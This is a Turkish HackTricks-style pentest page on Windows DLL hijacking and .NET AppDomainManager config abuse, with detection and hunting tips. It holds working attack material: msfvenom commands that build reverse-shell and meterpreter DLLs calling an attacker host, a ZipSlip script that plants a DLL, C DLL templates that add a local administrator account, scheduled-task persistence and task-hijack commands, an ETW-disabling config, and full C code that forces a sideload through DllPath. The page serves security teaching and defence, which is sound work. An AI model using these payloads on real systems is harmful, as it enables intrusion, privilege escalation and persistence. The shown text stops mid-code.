# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yüklemesini manipüle etmeyi içerir. Bu terim **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Esas olarak code execution, persistence ve daha nadir olarak privilege escalation için kullanılır. Buradaki odak escalation olsa da hijacking yöntemi hedeflere göre değişmez.

### Yaygın Teknikler

DLL hijacking için çeşitli yöntemler kullanılır ve her yöntemin etkinliği uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Gerçek bir DLL'yi kötü amaçlı olanla değiştirmek; isteğe bağlı olarak orijinal DLL'nin işlevselliğini korumak için DLL Proxying kullanmak.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'yi, meşru DLL'den önce gelen bir arama yoluna yerleştirerek uygulamanın arama düzeninden yararlanmak.
3. **Phantom DLL Hijacking**: Var olmayan ancak gerekli olduğu düşünülen bir DLL'yi yüklemesi için uygulamaya kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Meşru DLL'yi WinSxS dizininde kötü amaçlı bir karşılığıyla değiştirmek; bu yöntem genellikle DLL side-loading ile ilişkilidir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'yi kopyalanmış uygulamayla birlikte kullanıcı tarafından kontrol edilen bir dizine yerleştirmek; bu, Binary Proxy Execution tekniklerine benzer.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasik DLL sideloading, güvenilir bir **.NET Framework** sürecine attacker code yükletmenin tek yolu değildir. Hedef executable bir **managed** uygulamaysa CLR, executable'ın adını taşıyan bir **application configuration file** dosyasına da başvurur (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Config, EXE'nin yanına yerleştirilmiş attacker-controlled bir assembly'yi gösteriyorsa CLR bunu **application's normal code path** öncesinde yükler ve trusted process içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework configuration schema'sına göre custom manager'ın kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` mevcut olmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal yönetici:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Pratik notlar:
- Bu, **.NET Framework specific** bir tradecraft'tır. Win32 DLL search order'a değil, CLR config parsing'e dayanır.
- Host gerçekten bir **managed EXE** olmalıdır. Hızlı triage için: `sigcheck -m target.exe`, `corflags target.exe` veya PE metadata içindeki **CLR Runtime Header** kontrol edilebilir.
- Config filename, executable name ile tam olarak eşleşmelidir (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunur.
- Bu yöntem **signed Microsoft/vendor binaries** ile kullanışlıdır; trusted EXE değiştirilmeden malicious managed assembly in-process olarak çalıştırılır.
- Zaten writable bir installer/update directory erişiminiz varsa AppDomainManager hijacking **first stage** olarak, ardından sonraki aşamalar için classic DLL sideloading veya reflective loading kullanılabilir.

### AppDomainManager as a downloader + scheduled-task bootstrap

Pratik bir intrusion pattern, trusted managed EXE'yi hem malicious `*.config` hem de yalnızca **small bootstrapper** olarak görev yapan malicious bir AppDomainManager DLL ile birlikte kullanmaktır:<sup>[[25]](#references)</sup>

1. Kullanıcı, `%USERPROFILE%\Downloads` gibi inandırıcı bir konumdan signed bir .NET installer veya updater başlatır.
2. Yanındaki config, legitimate app logic başlamadan **önce** CLR'nin attacker assembly'yi yüklemesine neden olur.
3. Malicious manager bir **path gate** uygular (örneğin yalnızca host EXE `Downloads` konumundan çalışıyorsa devam eder ve yalnızca second stage'in `%LOCALAPPDATA%` konumundan çalışmasına izin verir).
4. Check başarılı olursa payload'ı `%LOCALAPPDATA%\PerfWatson2.exe` gibi user-writable bir path'e indirir ve scheduled task ile persistence kurar.

Bu varyantın önemi:
- Signed host EXE değiştirilmeden kaldığından, yalnızca main binary'yi hash'leyen triage compromise'ı gözden kaçırabilir.
- Basit **path-based anti-analysis** yaygındır: ZIP/EXE/DLL triad'ını Desktop, Temp veya sandbox path'ine taşımak chain'i kasıtlı olarak bozabilir.
- First-stage AppDomainManager DLL küçük ve low-noise kalabilir; gerçek implant daha sonra fetch edilir.

Bu pattern ile sıkça görülen minimal persistence örneği:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notlar:
- ` /rl highest`, ilgili kullanıcı/oturum için **kullanılabilir en yüksek** seviyeyi ifade eder; tek başına garantili bir SYSTEM yükseltmesi değildir.
- Bu technique, klasik eksik-DLL arama sırası hijacking'inden ziyade **.NET config abuse üzerinden execution/persistence** olarak sınıflandırılmaya genellikle daha uygundur; ancak operatörler pratikte sıklıkla her ikisini birlikte kullanır.

### Tespit odakları:
- **ZIP extraction paths**, `Downloads`, `%TEMP%` veya kullanıcı tarafından yazılabilir diğer klasörlerden başlatılan ve yanında `<exe>.config` bulunan imzalı .NET executable'ları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` altındaki bir konuma işaret eden ve adları browser/vendor updater'larını taklit eden yeni scheduled task'lar.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` başlatan kısa ömürlü managed bootstrap process'leri.
- Executable path beklenen bir user-profile directory ile eşleşmediği sürece erken çıkan sample'lar.

### Sideload zincirini yeniden başlatmak için mevcut bir scheduled task'ı hijack etme

Persistence için yalnızca **yeni bir task oluşturulmasına** odaklanmayın. Bazı intrusion set'leri, meşru bir installer'ın **normal bir updater task'ı** oluşturmasını bekler ve ardından action'ı **yeniden yazarak** mevcut adın, author bilgisinin ve trigger'ın defender'lara tanıdık kalmasını sağlar.

Yeniden kullanılabilir workflow:
1. Meşru software'i install/run edin ve normalde oluşturduğu task'ı belirleyin.
2. Task XML'ini export edin ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not alın.<sup>[[23]](#references)</sup>
3. Yalnızca action'ı değiştirerek task'ın, user-writable bir staging directory içinden **trusted host EXE**'nizi başlatmasını sağlayın; bu EXE daha sonra gerçek payload'ı side-load eder veya AppDomain-loads.
4. Yeni ve bariz bir persistence artifact'ı oluşturmak yerine aynı task name'i yeniden register edin.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Neden daha gizlidir:
- Görev adı hâlâ meşru görünebilir (örneğin bir vendor updater).
- **Task Scheduler service** görevi başlattığından, parent/ancestor doğrulaması genellikle `explorer.exe` yerine beklenen scheduling chain'i görür.
- Yalnızca **yeni görev adlarını** arayan DFIR ekipleri, kaydı zaten mevcut olan ancak action'ı artık `%LOCALAPPDATA%`, `%APPDATA%` veya saldırganın kontrolündeki başka bir path'i gösteren bir görevi gözden kaçırabilir.

Hızlı hunting pivot'ları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML'lerini ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata'sını bir baseline ile karşılaştırın.
- **Vendor-looking updater task** **user-writable directories** içinden çalıştığında veya yanındaki `*.config` dosyasıyla birlikte bir .NET EXE başlattığında alert oluşturun.

> [!TIP]
> HTML staging, AES-CTR configs ve .NET implants'ı DLL sideloading üzerine ekleyen step-by-step bir chain için aşağıdaki workflow'u inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik DLL'leri Bulma

Bir system içindeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals üzerinden [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filter'ı ayarlamaktır**:

![Common Techniques - Eksik DLL'leri Bulma: Bir system içindeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals üzerinden procmon çalıştırmak ve aşağıdaki 2 filter'ı ayarlamaktır](<../../../images/image (961).png>)

![Common Techniques - Eksik DLL'leri Bulma: Bir system içindeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals üzerinden procmon çalıştırmak ve aşağıdaki 2 filter'ı ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **File System Activity**'yi gösterin:

![Common Techniques - Eksik DLL'leri Bulma: ve yalnızca File System Activity'yi gösterin](<../../../images/image (153).png>)

**Genel olarak eksik dll'leri** arıyorsanız bunu birkaç **saniye** çalışır durumda **bırakın**.\
**Belirli bir executable içindeki eksik DLL'i** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filter ayarlayın, executable'ı çalıştırın ve event capture'ını durdurun.<sup>[[9]](#references)</sup>

## Eksik DLL'leri Exploit Etme

Privilege escalation gerçekleştirmek için **privileged bir process'in** yazabildiğiniz bir konumdan yüklemeye çalıştığı bir **DLL** arayın. Bu durum, legitimate DLL'i içeren directory'den önce aranan bir directory'yi kontrol ettiğinizde veya istenen DLL mevcut olmadığında ve aranan directory'lerden birine yazabildiğinizde meydana gelebilir.

### DLL Search Order

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **içinde DLL'lerin özellikle nasıl yüklendiğini bulabilirsiniz.**

**Windows applications**, belirli bir sequence'e uyarak **pre-defined search path'lerini** izler ve DLL'leri arar. DLL hijacking problemi, zararlı bir DLL bu directory'lerden birine stratejik olarak yerleştirildiğinde ve authentic DLL'den önce yüklenmesi sağlandığında ortaya çıkar. Bunu önlemenin bir çözümü, application'ın ihtiyaç duyduğu DLL'lere başvururken absolute path'ler kullanmasını sağlamaktır.

Aşağıda **32-bit** system'lerdeki **DLL search order**'ı görebilirsiniz:

1. Application'ın yüklendiği directory.
2. System directory. Bu directory'nin path'ini almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function'ını kullanın.(_C:\Windows\System32_)
3. 16-bit system directory. Bu directory'nin path'ini alan bir function yoktur, ancak aranır. (_C:\Windows\System_)
4. Windows directory. Bu directory'nin path'ini almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function'ını kullanın.
1. (_C:\Windows_)
5. Current directory.
6. PATH environment variable içinde listelenen directory'ler. Bunun **App Paths** registry key'i tarafından belirtilen per-application path'i içermediğine dikkat edin. DLL search path hesaplanırken **App Paths** key'i kullanılmaz.

Bu, **SafeDllSearchMode** etkin durumdayken kullanılan **default** search order'dır. Devre dışı bırakıldığında current directory ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value'sunu oluşturun ve 0 olarak ayarlayın (default olarak etkindir).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function'ı **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa search, **LoadLibraryEx**'in yüklediği executable module'ün directory'sinde başlar.

Son olarak bir DLL, name yerine absolute path kullanılarak yüklenebilir. Bu durumda Windows, DLL'in kendisi için yalnızca bu path'e bakar; name ile istenen dependencies yine geçerli search order'ı izler.

Search order'ı değiştirmenin başka yolları da vardır, ancak bunları burada açıklamayacağım.

### Arbitrary file write'ı missing-DLL hijack'e Chaining Etme

1. Process'in probe ettiği ancak bulamadığı DLL name'lerini toplamak için **ProcMon** filter'larını (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kullanın.<sup>[[14]](#references)</sup>
2. Binary bir **schedule/service** üzerinde çalışıyorsa, bu name'lerden birine sahip bir DLL'i **application directory**'ye (search-order entry #1) bırakmak, bir sonraki execution'da DLL'in yüklenmesini sağlar. Bir .NET scanner vakasında process, gerçek copy'yi `C:\Program Files\dotnet\fxr\...` path'inden yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` arıyordu.
3. Herhangi bir export'a sahip bir payload DLL (ör. reverse shell) oluşturun: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive'iniz **ZipSlip-style arbitrary write** ise, extraction dir'den kaçacak ve DLL'in app folder'a düşmesini sağlayacak bir ZIP oluşturun:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Arşivi izlenen inbox/share konumuna teslim edin; scheduled task işlemi yeniden başlattığında malicious DLL yüklenir ve kodunuz service account yetkileriyle çalıştırılır.

### RTL_USER_PROCESS_PARAMETERS.DllPath ile sideloading'i zorlama

Yeni oluşturulan bir process'in DLL search path'ini deterministik olarak etkilemenin gelişmiş bir yolu, process'i ntdll'nin native API'leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya attacker-controlled bir directory sağlayarak, imported bir DLL'yi adına göre çözen (absolute path kullanmayan ve safe loading flags kullanmayan) bir target process'in malicious DLL'yi bu directory'den yüklemesi zorlanabilir.

Temel fikir
- RtlCreateProcessParametersEx ile process parameters oluşturun ve controlled folder'ınızı (örneğin dropper/unpacker'ınızın bulunduğu directory) gösteren özel bir DllPath sağlayın.
- RtlCreateUserProcess ile process'i oluşturun. Target binary bir DLL'yi adına göre çözdüğünde loader, çözümleme sırasında sağlanan DllPath'e başvurur; böylece malicious DLL target EXE ile aynı directory'de bulunmasa bile güvenilir sideloading sağlanır.

Notlar/sınırlamalar
- Bu, oluşturulan child process'i etkiler; yalnızca current process'i etkileyen SetDllDirectory'den farklıdır.
- Target, DLL'yi adına göre import etmeli veya LoadLibrary ile yüklemelidir (absolute path kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve hardcoded absolute paths hijack edilemez. Forwarded exports ve SxS öncelik sırasını değiştirebilir.

Minimal C örneği (ntdll, wide strings, basitleştirilmiş error handling):

<details>
<summary>RTL_USER_PROCESS_PARAMETERS.DllPath ile DLL sideloading'i zorlama: Tam C örneği</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Gerekli işlevleri dışa aktaran veya gerçek DLL'ye proxy görevi gören kötü amaçlı bir xmllite.dll dosyasını DllPath dizininize yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını ada göre aradığı bilinen, imzalı bir binary başlatın. Loader, import işlemini sağlanan DllPath üzerinden çözer ve DLL'nizi sideload eder.

Bu tekniğin, gerçek dünyada çok aşamalı sideloading zincirlerini yürütmek için kullanıldığı gözlemlenmiştir: ilk launcher bir yardımcı DLL bırakır, ardından bu DLL, özel bir DllPath ile ele geçirilebilir bir Microsoft-imzalı binary başlatarak saldırganın DLL'sinin bir staging dizininden yüklenmesini zorlar.<sup>[[6]](#references)</sup>


### `.exe.config` üzerinden .NET AppDomainManager hijacking

**.NET Framework** hedefleri için sideloading, belleğe patch uygulamadan ve **`.exe.config`** dosyasını kötüye kullanarak **`Main()`** işlevinden **önce** gerçekleştirilebilir. Saldırgan, yalnızca Win32 DLL arama sırasına güvenmek yerine, meşru bir .NET EXE dosyasını kötü amaçlı bir config dosyasının ve saldırganın kontrolündeki bir veya daha fazla assembly'nin yanına yerleştirir.

Zincirin çalışma şekli:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE başlatılır ve **CLR, `<exe>.config` dosyasını okur**.
2. Config, çalışma zamanının saldırganın kontrolündeki bir `AppDomainManager` örneğini oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlar.
3. Kötü amaçlı manager, güvenilir host process içinde **`Main()` öncesi çalıştırma** elde eder.
4. Aynı config, CLR'ın yerel assembly'leri önce çözümlemesini (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) sağlayabilir ve inline patch uygulamadan runtime doğrulamasını/telemetrisini zayıflatabilir.

Campaign tarzı pattern (tam iç içe yerleşim, directive / CLR version'a göre değişebilir):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Neden kullanışlıdır:
- **`<probing privatePath="."/>`**, assembly resolution işlemini application directory içinde tutarak klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, CLR initialization sırasında, legitimate app logic çalışmadan önce execution işlemini attacker code içine taşır.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**, full-trust bir app'in strong-name validation hatası olmadan unsigned veya değiştirilmiş assembly'leri yüklemesine izin verebilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher-policy yönlendirmeleriyle daha yeni assembly'lere geçişi önler.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha deterministik hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**, özellikle ilgi çekicidir; çünkü **CLR kendi ETW görünürlüğünü** implantın memory içinde `EtwEventWrite` patch'lemesi yerine configuration üzerinden devre dışı bırakır.

Son kampanyalarda görülen operational pattern:
- Stage 1, `setup.exe`, `setup.exe.config` ve local assembly'leri bırakır.
- Stage 2, bunları inandırıcı bir **AppData update** klasörüne kopyalar, host'u `update.exe` gibi bir adla yeniden adlandırır ve **scheduled task** aracılığıyla yeniden başlatır.
- Stage 3, final RAT DLL/export'unu yüklemeden önce execution context'i doğrular (örneğin Task Scheduler'dan beklenen parent `svchost.exe`).

Hunting fikirleri:
- Kullanıcının yazma yetkisine sahip olduğu konumlarda şüpheli bitişik **`.config`** dosyalarıyla çalışan imzalı veya başka şekilde legitimate **.NET executable**'ları.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- Yeniden adlandırılmış update binary'lerini **`%LOCALAPPDATA%`** veya uygulamaya özel `\bin\update\` dizinlerinden yeniden başlatan scheduled task'ler.
- Bir scheduled task'in trusted .NET host'u başlattığı ve host'un kendi directory'sinden vendor dışı assembly'leri hemen yüklediği parent/child zincirleri.

#### Windows docs üzerindeki dll search order istisnaları

Windows documentation'da standard DLL search order için bazı istisnalar belirtilmiştir:

- **Memory'de zaten yüklenmiş olan bir DLL ile aynı ada sahip bir DLL** ile karşılaşıldığında sistem normal search işlemini bypass eder. Bunun yerine, memory'de bulunan DLL'yi kullanmadan önce redirection ve manifest kontrolü gerçekleştirir. **Bu senaryoda sistem DLL için search gerçekleştirmez**.
- DLL, mevcut Windows version için bir **known DLL** olarak tanınıyorsa sistem, search process'i **uygulamadan**, known DLL'nin kendi version'ını ve dependent DLL'lerini kullanır. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**, bu known DLL'lerin listesini içerir.
- Bir **DLL'nin dependencies'leri** varsa bu dependent DLL'ler için search, initial DLL'nin full path kullanılarak tanımlanmış olmasından bağımsız olarak, yalnızca **module names** ile belirtilmiş gibi gerçekleştirilir.

### Privilege Escalation

**Gereksinimler**:

- **Farklı privileges** altında çalışan veya çalışacak (horizontal veya lateral movement) ve **eksik bir DLL'ye** sahip olan bir process belirleyin.
- **DLL** için search gerçekleştirilecek herhangi bir **directory** üzerinde **write access** bulunduğundan emin olun. Bu konum executable'ın directory'si veya system path içindeki bir directory olabilir.

Bu ön koşullar varsayılan olarak yaygın değildir: privileged executable'ların missing DLL dependencies'leri genellikle olmaz ve standard user'lar normalde system search-path directory'lerine yazamaz. Yanlış yapılandırılmış environment'lar yine de her iki koşulu da açığa çıkarabilir.\
Gereksinimler karşılanıyorsa [UACME](https://github.com/hfiref0x/UACME) project'ini inceleyin. Ana amacı UAC bypass olsa da belirli Windows version'ları için DLL-hijacking PoC'leri içerir; bunlar çoğu zaman bulduğunuz writable directory'ye uyarlanabilir.

Bir folder içindeki **permissions'larınızı** şu şekilde **check edebileceğinizi** unutmayın:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bir executable'ın imports değerlerini ve bir dll'nin exports değerlerini şu araçla da kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**Dll Hijacking ile privilege escalation** işlemini **System Path klasörüne** yazma izinleriyle nasıl gerçekleştireceğinize dair kapsamlı bir kılavuz için kontrol edin:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), System PATH içindeki herhangi bir klasörde yazma izinleriniz olup olmadığını kontrol eder.\
Bu vulnerability'yi keşfetmek için kullanılabilecek diğer ilginç otomatik araçlar **PowerSploit functions**'larıdır: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Örnek

Exploitable bir senaryo bulmanız durumunda, bunu başarılı şekilde exploit etmek için en önemli şeylerden biri, **executable'ın kendisinden import edeceği en az tüm functions'ları export eden bir dll oluşturmaktır**. Bununla birlikte, Dll Hijacking'in [Medium Integrity level'dan High seviyesine **(UAC'yi bypass ederek)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya[ **High Integrity'den SYSTEM'e**](../index.html#from-high-integrity-to-system) geçiş yapmak için kullanışlı olduğunu unutmayın**.** Execution amacıyla Dll Hijacking'e odaklanan bu çalışmada **geçerli bir dll'in nasıl oluşturulacağına** dair bir örnek bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölümde**, **template** olarak kullanılabilecek veya **gerekli olmayan functions'ları export eden bir dll oluşturmak** için yararlı olabilecek bazı **temel dll kodlarını** bulabilirsiniz.

## **Dll'lerin oluşturulması ve derlenmesi**

### **Dll Proxifying**

Temel olarak bir **Dll proxy**, **yüklendiğinde malicious code'unuzu çalıştırabilen**, ancak aynı zamanda **gerçek library'ye yapılan tüm çağrıları ileterek** **expose** olan ve **beklendiği gibi çalışan** bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla bir **executable belirtebilir ve proxify etmek istediğiniz library'yi seçebilir**, ardından **proxified bir dll oluşturabilir** ya da **Dll'i belirterek proxified bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) edinin:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kullanıcı oluştur (x86, bir x64 sürümü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi DLL'iniz

Birçok durumda derlediğiniz DLL, **victim process tarafından import edilen her function'ı export etmelidir**. Gerekli bir export eksikse binary bunu çözümleyemez ve exploit başarısız olur.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Kullanıcı oluşturmalı C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Thread girişine sahip alternatif C DLL'i</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
